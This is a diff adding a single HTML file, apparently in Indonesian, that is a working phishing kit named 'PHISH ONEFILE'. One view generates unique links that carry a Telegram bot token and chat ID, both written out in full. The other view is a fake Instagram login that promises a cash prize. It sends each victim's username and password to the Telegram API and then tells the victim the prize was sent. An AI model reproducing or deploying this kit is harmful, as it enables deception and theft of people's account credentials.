@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>PHISH ONEFILE - BOT LU</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Roboto+Mono&display=swap');
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { background:#000; color:#0f0; font-family:'Roboto Mono',monospace; text-align:center; padding:20px; min-height:100vh; }
+    .container { max-width:500px; margin:40px auto; padding:30px; background:rgba(0,20,0,0.8); border:2px solid #0f0; border-radius:15px; box-shadow:0 0 30px #0f0; }
+    h1 { font-family:'Orbitron',sans-serif; font-size:2rem; color:#0f0; text-shadow:0 0 15px #0f0; }
+    button { width:100%; margin:15px 0; padding:15px; font-size:1rem; border:2px solid #0f0; border-radius:8px; background:#0f0; color:#000; font-weight:bold; cursor:pointer; }
+    button:hover { background:#0c0; transform:scale(1.05); }
+    .result { margin-top:20px; padding:15px; background:rgba(0,50,0,0.5); border:1px dashed #0f0; border-radius:10px; display:none; }
+    .link { color:#0ff; font-weight:bold; word-break:break-all; font-size:0.9rem; }
+    .copy { background:#111; color:#0f0; padding:10px; border-radius:5px; margin:10px 0; }
+    .loader { color:#0f0; animation:blink 1s infinite; }
+    .phish-form { display:none; margin-top:30px; }
+    @keyframes blink { 0%,100% { opacity:1; } 50% { opacity:0; } }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <h1>PHISH ONEFILE</h1>
+  <p><b>BOT LU SUDAH TERHUBUNG!</b></p>
+  <p style="font-size:0.8rem; color:#aaa;">Token & Chat ID otomatis terpakai</p>
+
+  <button onclick="generateLink()">GENERATE LINK PHISHING</button>
+
+  <div id="result" class="result">
+    <div class="loader">Membuat link...</div>
+    <div id="output"></div>
+  </div>
+</div>
+
+<!-- PHISHING PAGE -->
+<div id="phish" class="phish-form">
+  <h2>LOGIN INSTAGRAM</h2>
+  <p style="color:#ff69b4;">Hadiah Rp 1 Juta!</p>
+  <input type="text" id="user" placeholder="Username / Email" />
+  <input type="password" id="pass" placeholder="Password" />
+  <button onclick="sendPhish()">LOGIN</button>
+</div>
+
+<script>
+// === BOT LU (SUDAH DI-ISI) ===
+const TOKEN = '8557655529:AAHTOcGb1Pf7uVNXlPx4fxcdddFy7jTSPpU';
+const CHAT_ID = '8460744156';
+let config = {};
+
+// === GENERATE LINK ===
+function generateLink() {
+  const result = document.getElementById('result');
+  const output = document.getElementById('output');
+  const loader = result.querySelector('.loader');
+  
+  result.style.display = 'block';
+  loader.style.display = 'block';
+  output.innerHTML = '';
+
+  setTimeout(() => {
+    loader.style.display = 'none';
+    config = { token: TOKEN, chatid: CHAT_ID, uid: Date.now().toString(36) + Math.random().toString(36).substr(2,5) };
+    const encoded = btoa(JSON.stringify(config));
+    const link = location.href.split('?')[0] + '?phish=' + encoded;
+
+    output.innerHTML = `
+      <p>Link Phishing Unik Lu:</p>
+      <div class="copy"><span class="link">${link}</span></div>
+      <button onclick="copy('${link}')">COPY LINK</button>
+      <p style="font-size:0.8rem; color:#aaa;">Sebarkan → data masuk ke Telegram lu!</p>
+    `;
+  }, 1500);
+}
+
+function copy(text) {
+  navigator.clipboard.writeText(text).then(() => alert("Link disalin!"));
+}
+
+// === CEK PHISHING MODE ===
+const urlParams = new URLSearchParams(window.location.search);
+if (urlParams.has('phish')) {
+  document.querySelector('.container').style.display = 'none';
+  document.getElementById('phish').style.display = 'block';
+  try {
+    config = JSON.parse(atob(urlParams.get('phish')));
+  } catch(e) { alert("Link rusak!"); }
+}
+
+function sendPhish() {
+  const user = document.getElementById('user').value.trim();
+  const pass = document.getElementById('pass').value;
+  if (!user || !pass) return alert("Isi dulu!");
+
+  const text = `PHISHING BERHASIL!\nUser: ${user}\nPass: ${pass}\nIP: ${navigator.userAgent.substring(0,50)}...`;
+
+  fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: new URLSearchParams({
+      chat_id: config.chatid,
+      text: text
+    })
+  }).then(() => {
+    alert("Login berhasil! Hadiah dikirim.");
+  });
+}
+</script>
+
+</body>
+</html>
